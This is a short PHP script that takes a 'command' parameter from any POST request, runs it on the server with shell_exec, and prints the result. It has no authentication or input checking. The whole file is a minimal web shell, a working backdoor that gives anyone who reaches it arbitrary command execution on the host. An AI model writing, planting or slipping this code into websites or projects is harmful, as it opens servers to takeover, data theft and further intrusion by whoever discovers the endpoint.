<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'];
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}
?>

